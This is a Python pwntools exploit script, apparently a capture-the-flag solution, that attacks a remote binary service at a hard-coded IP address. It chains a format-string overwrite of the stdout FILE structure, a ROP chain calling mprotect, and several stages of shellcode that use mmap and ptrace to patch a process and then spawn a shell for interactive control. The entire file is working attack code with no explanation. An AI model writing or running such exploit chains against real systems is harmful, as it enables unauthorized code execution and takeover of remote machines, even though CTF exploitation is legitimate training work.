from pwn import *
from libformatstr import *

#p = process('./pwn')
p = remote('183.60.136.226',17381)
#p = remote('127.0.0.1',23333)
#context.log_level = 'debug'
context.arch = 'amd64'

stdout = 0x6cb300
f = FormatStr(isx64=1,autosort=False)
f[stdout+0xa0]=stdout
f[stdout+0x98]=stdout+0x30
f[stdout+0x50]=0x4009AE # input function
f.dword(stdout+0xd8,0x4a3260-0x38) # _IO_wfile_sync

p.recvuntil('Input your message,it will echo back.\n')
raw_input('enter1')
p.sendline(f.payload(8))

with p.waitfor('Receiving all data') as h:
    with p.local(3):
        try:
            while True:
                if not p.recv():
                    break
        except EOFError:
            pass

payload = p64(0x40265a) #pop rdi ; pop rbp ; ret
payload += p64(stdout&0xFFFFF000) #rdi
payload += p64(stdout)
payload += p64(0x402658) #pop rsi ; pop r15 ; pop rbp ; ret
payload += p64(0x2000) #rsi
payload += p64(1)
payload += p64(0x4bb078) #call
payload += p64(0x443f96) #pop rdx ; ret
payload += p64(7) #rdx
payload += p64(0x4415e0) #mprotect
payload += p64(stdout+0x88+0x20)
payload += p64(stdout)
payload += p64(stdout)
payload += p64(stdout)
payload += p64(stdout)
data = asm(
    '''
    xor edi,edi
    mov esi,0x1000
    mov r8d,0xFFFFFFFF
    mov edx,7
    xor r9d,r9d
    mov r10d,0x22
    mov eax,9
    syscall
    jmp rax
    '''
)
#payload += data
payload += asm(shellcraft.linux.read(0,stdout+0xe0,0x100))
payload += asm(
'''
mov bx,0xb3e0
jmp rbx
'''
)

#0x00000000004baf78 : xchg eax, edi ; xchg eax, esp ; ret
#0x00000000004025da : pop rdi ; pop rbp ; ret
#0x00000000004025d8 : pop rsi ; pop r15 ; pop rbp ; ret
#0x0000000000443aa6 : pop rdx ; ret


raw_input('enter2')
p.sendline(payload)

payload2 = asm('''
xor rdi,rdi
mov edi,0x6cd000
xor rsi,rsi
mov esi,0x2000
mov rdx,0x7
xor rax,rax
mov eax,10
syscall

xor rsi,rsi
mov esi,edi
xor rdi,rdi
xor rdx,rdx
mov edx,0x2000
xor rax,rax
syscall

jmp rsi

'''
)
print len(payload2)
p.sendline(payload2)


payload3 = asm(
'''
    xor	r9d, r9d
    xor	edi, edi
    mov r8d, 0xFFFFFFFF
    mov	ecx, 0x22
    mov	edx, 3
    mov	esi, 0x4000
    mov rax, 0x441500
    call rax
    mov rbp,rax
    add rax,0x3f00
    mov rsp,rax

    xor rax,rax
    mov al,110
    syscall

    mov r15,rax
    mov rsi,rax
    mov di,0x10
    xor r10,r10
    mov rdx,r10
    call ptrace

    xor rsi,rsi
    mov rdi,r15
    call wait

    call getaddr
    xor r12,r12
    mov rbx,r12
    mov rdx,0x43ff80
    mov r14,rax

write:
    mov rdi,5
    mov r10,qword ptr [r14]
    mov rsi,r15
    call ptrace

    inc r12
    cmp r12,6
    add rdx,8
    add r14,8
    jnz write

    mov di,17
    mov rsi,r15
    xor rdx,rdx
    mov r10,rdx
    call ptrace

    xor rax,rax
    mov rdi,0
    mov al,60
    syscall
ptrace:
    xor rax,rax
    mov al,0x65
    syscall
    ret

wait:

    xor     r10d, r10d
    movsxd  rdx, edx
    movsxd  rdi, edi
    mov     eax, 0x3D
    syscall
    ret

getaddr:
    lea rax,[rip+1]
    ret
'''+shellcraft.sh())

raw_input('enter3')
p.send(payload3)

p.interactive()
